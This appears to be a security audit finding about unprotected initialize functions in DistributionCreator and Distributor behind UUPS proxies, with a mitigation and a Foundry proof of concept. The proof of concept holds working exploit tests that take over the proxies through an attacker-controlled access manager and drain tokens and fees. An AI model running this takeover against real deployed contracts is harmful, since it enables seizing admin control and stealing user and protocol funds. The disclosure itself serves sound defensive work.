  "body": "## Finding description and impact\n\nWhen I checked the initialize function in DistributionCreator, I noticed it only uses the initializer modifier and has no access control on the caller. Distributor follows the same pattern. Both contracts are set up for use behind UUPS proxies, where the constructor with initializer runs only on the implementation, not on each proxy instance.\n\nBecause of that, every freshly deployed proxy starts with the initialized flag at zero, and the first external address to call initialize gets to set the accessControlManager (and also the distributor address and default fees in DistributionCreator). If an attacker deploys a malicious accessControlManager that always treats them as governor or guardian, they can initialize the proxy to point to this contract. From that point on, all onlyGovernor, onlyGovernorOrGuardian, and onlyUpgradeableInstance checks are effectively under attacker control, giving them full admin over DistributionCreator and Distributor.\n\n## Recommended mitigation steps\n\nRestrict the initialize functions to a trusted role (e.g. a deployer-only or governor-only modifier) and ensure proxies are deployed and initialized atomically in the same transaction. Alternatively, avoid leaving any externally callable initialization path that can be invoked on an uninitialized proxy.",
  "proof_of_concept": "```solidity\npragma solidity ^0.8.17;\n\nimport {Test, console} from \"forge-std/Test.sol\";\nimport {ERC1967Proxy} from \"@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol\";\nimport {ERC20} from \"@openzeppelin/contracts/token/ERC20/ERC20.sol\";\nimport {IERC20} from \"@openzeppelin/contracts/token/ERC20/IERC20.sol\";\nimport {DistributionCreator} from \"../../contracts/DistributionCreator.sol\";\nimport {Distributor} from \"../../contracts/Distributor.sol\";\nimport {IAccessControlManager} from \"../../contracts/interfaces/IAccessControlManager.sol\";\n\ncontract AttackerAccessControlManager is IAccessControlManager {\n    address public attacker;\n\n    constructor(address _attacker) {\n        attacker = _attacker;\n    }\n\n    function isGovernor(address account) external view returns (bool) {\n        return account == attacker;\n    }\n\n    function isGovernorOrGuardian(address account) external view returns (bool) {\n        return account == attacker;\n    }\n}\n\ncontract MockToken is ERC20 {\n    constructor() ERC20(\"Mock\", \"MCK\") {\n        _mint(msg.sender, 1_000_000 ether);\n    }\n\n    function mint(address to, uint256 amount) external {\n        _mint(to, amount);\n    }\n}\n\ncontract PoC_InitializerTakeover is Test {\n    DistributionCreator creatorImpl;\n    Distributor distributorImpl;\n\n    address attacker;\n    address legitimateOwner;\n\n    function setUp() public {\n        attacker = makeAddr(\"attacker\");\n        legitimateOwner = makeAddr(\"legitimateOwner\");\n\n        creatorImpl = new DistributionCreator();\n        distributorImpl = new Distributor();\n    }\n\n    function testAttackerTakesOverDistributorProxy() public {\n        ERC1967Proxy distributorProxy = new ERC1967Proxy(\n            address(distributorImpl),\n            \"\"\n        );\n\n        AttackerAccessControlManager attackerACM = new AttackerAccessControlManager(attacker);\n\n        vm.prank(attacker);\n        Distributor(address(distributorProxy)).initialize(IAccessControlManager(address(attackerACM)));\n\n        assertEq(\n            address(Distributor(address(distributorProxy)).accessControlManager()),\n            address(attackerACM),\n            \"Attacker should control accessControlManager\"\n        );\n\n        IAccessControlManager legitimateACM = IAccessControlManager(makeAddr(\"legitimateACM\"));\n\n        vm.prank(legitimateOwner);\n        vm.expectRevert();\n        Distributor(address(distributorProxy)).initialize(legitimateACM);\n\n        console.log(\"[SUCCESS] Attacker has taken over Distributor proxy\");\n    }\n\n    function testAttackerTakesOverCreatorProxy() public {\n        ERC1967Proxy creatorProxy = new ERC1967Proxy(\n            address(creatorImpl),\n            \"\"\n        );\n\n        AttackerAccessControlManager attackerACM = new AttackerAccessControlManager(attacker);\n        address fakeDistributor = makeAddr(\"fakeDistributor\");\n        uint256 maliciousFees = 0;\n\n        vm.prank(attacker);\n        DistributionCreator(address(creatorProxy)).initialize(\n            IAccessControlManager(address(attackerACM)),\n            fakeDistributor,\n            maliciousFees\n        );\n\n        assertEq(\n            address(DistributionCreator(address(creatorProxy)).accessControlManager()),\n            address(attackerACM)\n        );\n        assertEq(\n            DistributionCreator(address(creatorProxy)).distributor(),\n            fakeDistributor\n        );\n\n        console.log(\"[SUCCESS] Attacker has taken over DistributionCreator proxy\");\n    }\n\n    function testAttackerExercisesGovernanceControl() public {\n        ERC1967Proxy distributorProxy = new ERC1967Proxy(address(distributorImpl), \"\");\n        ERC1967Proxy creatorProxy = new ERC1967Proxy(address(creatorImpl), \"\");\n\n        AttackerAccessControlManager attackerACM = new AttackerAccessControlManager(attacker);\n\n        vm.startPrank(attacker);\n\n        Distributor(address(distributorProxy)).initialize(\n            IAccessControlManager(address(attackerACM))\n        );\n\n        DistributionCreator(address(creatorProxy)).initialize(\n            IAccessControlManager(address(attackerACM)),\n            address(distributorProxy),\n            0\n        );\n\n        vm.stopPrank();\n\n        vm.prank(attacker);\n        DistributionCreator(address(creatorProxy)).setFeeRecipient(attacker);\n\n        assertEq(\n            DistributionCreator(address(creatorProxy)).feeRecipient(),\n            attacker,\n            \"Attacker should be fee recipient\"\n        );\n\n        console.log(\"[SUCCESS] Attacker has taken over governance:\");\n        console.log(\"  - Controls accessControlManager\");\n        console.log(\"  - Can set fee recipient\");\n        console.log(\"  - Can modify protocol parameters\");\n        console.log(\"  - Can upgrade contracts (UUPS)\");\n    }\n\n    function testAttackerDrainsDistributorFunds() public {\n        ERC1967Proxy distributorProxy = new ERC1967Proxy(address(distributorImpl), \"\");\n        AttackerAccessControlManager attackerACM = new AttackerAccessControlManager(attacker);\n\n        vm.prank(attacker);\n        Distributor(address(distributorProxy)).initialize(IAccessControlManager(address(attackerACM)));\n\n        MockToken token = new MockToken();\n        uint256 victimFunds = 100 ether;\n        token.mint(address(distributorProxy), victimFunds);\n\n        assertEq(token.balanceOf(address(distributorProxy)), victimFunds);\n        assertEq(token.balanceOf(attacker), 0);\n\n        vm.prank(attacker);\n        Distributor(address(distributorProxy)).recoverERC20(address(token), attacker, victimFunds);\n\n        assertEq(token.balanceOf(address(distributorProxy)), 0, \"Distributor should be drained\");\n        assertEq(token.balanceOf(attacker), victimFunds, \"Attacker should have stolen funds\");\n\n        console.log(\"[SUCCESS] Attacker drained\", victimFunds / 1 ether, \"tokens from Distributor via recoverERC20\");\n    }\n\n    function testAttackerDrainsCreatorFees() public {\n        ERC1967Proxy creatorProxy = new ERC1967Proxy(address(creatorImpl), \"\");\n        ERC1967Proxy distributorProxy = new ERC1967Proxy(address(distributorImpl), \"\");\n        AttackerAccessControlManager attackerACM = new AttackerAccessControlManager(attacker);\n\n        vm.startPrank(attacker);\n        Distributor(address(distributorProxy)).initialize(IAccessControlManager(address(attackerACM)));\n        DistributionCreator(address(creatorProxy)).initialize(\n            IAccessControlManager(address(attackerACM)),\n            address(distributorProxy),\n            0\n        );\n        vm.stopPrank();\n\n        MockToken token = new MockToken();\n        uint256 protocolFees = 50 ether;\n        token.mint(address(creatorProxy), protocolFees);\n\n        assertEq(token.balanceOf(address(creatorProxy)), protocolFees);\n        assertEq(token.balanceOf(attacker), 0);\n\n        IERC20[] memory tokens = new IERC20[](1);\n        tokens[0] = IERC20(address(token));\n\n        vm.prank(attacker);\n        DistributionCreator(address(creatorProxy)).recoverFees(tokens, attacker);\n\n        assertEq(token.balanceOf(address(creatorProxy)), 0, \"DistributionCreator should be drained\");\n        assertEq(token.balanceOf(attacker), protocolFees, \"Attacker should have stolen fees\");\n\n        console.log(\"[SUCCESS] Attacker drained\", protocolFees / 1 ether, \"tokens from DistributionCreator via recoverFees\");\n    }\n}\n```",
